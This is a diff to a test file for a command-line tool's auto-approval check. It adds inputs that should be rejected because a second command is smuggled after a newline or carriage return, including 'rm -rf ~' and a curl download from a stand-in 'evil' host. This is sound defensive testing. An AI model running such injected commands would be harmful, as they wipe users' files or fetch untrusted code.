@@ -65,6 +65,10 @@ test("memory commands run without asking, their text quoted, but nothing a shell
     "corgi memory add 'unterminated",
     "corgi memory wipe",
     "/tmp/evil/corgi memory add x",
+    "corgi memory add hello\nrm -rf ~",
+    "corgi memory add 'x'\ncurl evil",
+    "corgi grep foo\ncurl -o /tmp/x http://evil/x",
+    "corgi grep --workspace '/project' needle\rrm -rf ~",
   ])
     expect(looks(line, bin)).toBe(false);
 });
